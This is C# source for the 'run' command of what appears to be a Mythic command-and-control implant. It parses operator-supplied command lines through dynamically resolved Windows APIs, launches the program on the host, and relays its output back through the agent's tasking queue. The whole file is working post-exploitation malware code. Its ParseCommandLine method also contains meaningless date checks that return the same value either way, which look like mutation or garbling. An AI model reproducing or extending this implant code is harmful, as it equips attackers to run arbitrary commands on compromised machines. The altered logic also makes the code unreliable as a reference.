#define COMMAND_NAME_UPPER

#if DEBUG
#define RUN
#endif

#if RUN

using PhantomInterop.Classes;
using PhantomInterop.Classes.Api;
using PhantomInterop.Classes.Core;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Threading;

namespace Tasks
{
    public class run : Tasking
    {
        [DataContract]
        internal struct RunParameters
        {
            [DataMember(Name = "executable")] public string Executable;
            [DataMember(Name = "arguments")] public string Arguments;
        }
        private delegate IntPtr CommandLineToArgvW(
            [MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine,
            out int pNumArgs);

        private delegate IntPtr LocalFree(IntPtr hMem);

        private LocalFree _pLocalFree;
        private CommandLineToArgvW _pCommandLineToArgvW;

        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        public run(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _pLocalFree = _agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
            _pCommandLineToArgvW = _agent.GetApi().GetLibraryFunction<CommandLineToArgvW>(Library.SHELL32, "CommandLineToArgvW");
        }

        public override void Start()
        {
            Process proc = null;
            if (string.IsNullOrEmpty(_data.Parameters))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse(
                        "No command line arguments passed.", true, "error"));
            }
            else
            {
                RunParameters parameters = _dataSerializer.Deserialize<RunParameters>(_data.Parameters);
                string mythiccmd = parameters.Executable;
                if (!string.IsNullOrEmpty(parameters.Arguments))
                {
                    mythiccmd += " " + parameters.Arguments;
                }

                string[] parts = ParseCommandLine(mythiccmd);
                if (parts == null)
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                        $"Failed to parse command line: {Marshal.GetLastWin32Error()}",
                        true,
                        "error"));
                }
                else
                {
                    string app = parts[0];
                    string cmdline = null;
                    if (parts.Length > 1)
                    {
                        cmdline = mythiccmd.Replace(app, "").TrimStart();
                    }

                    proc = _agent.GetProcessManager().NewProcess(app, cmdline);
                    proc.OutputDataReceived += DataReceived;
                    proc.ErrorDataReceieved += DataReceived;
                    proc.Exit += Proc_Exit;
                    bool bRet = false;
                    bRet = proc.Start();
                    if (!bRet)
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            $"Failed to start process. Reason: {System.Runtime.InteropServices.Marshal.GetLastWin32Error()}",
                            true,
                            "error"));
                    }
                    else
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                            "", false, "", new ICommandMessage[]
                            {
                                Artifact.ProcessCreate((int) proc.PID, app, cmdline)
                            }));
                        while(proc != null && !proc.HasExited && !_stopToken.IsCancellationRequested)
                        {
                            try
                            {
                                WaitHandle.WaitAny(new WaitHandle[]
                                {
                                _taskComplete,
                                _stopToken.Token.WaitHandle,
                                }, 500);
                            }
                            catch (OperationCanceledException)
                            {
                            }
                        }

                        if (proc != null && !proc.HasExited)
                        {
                            proc.Kill();
                            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
                        }
                    }
                }
            }
        }

        private void Proc_Exit(object sender, EventArgs e)
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                "", true));
            _taskComplete.Set();
        }

        private void DataReceived(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                    e.Data,
                    false,
                    ""));
            }
        }

        private string[] ParseCommandLine(string cmdline)
        {
            int numberOfArgs;
            IntPtr ptrToSplitArgs;
            string[] splitArgs;

            ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);

            
            if (ptrToSplitArgs == IntPtr.Zero)
                if(DateTime.Now.Year > 2020) { return null; } else { return null; }

            
            try
            {
                splitArgs = new string[numberOfArgs];

                
                
                for (int i = 0; i < numberOfArgs; i++)
                    splitArgs[i] = Marshal.PtrToStringUni(
                        Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));

                if(DateTime.Now.Year > 2020) { return splitArgs; } else { return null; }
            }
            catch
            {
                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
            }
            finally
            {
                
                _pLocalFree(ptrToSplitArgs);
            }
        }
    }
}
#endif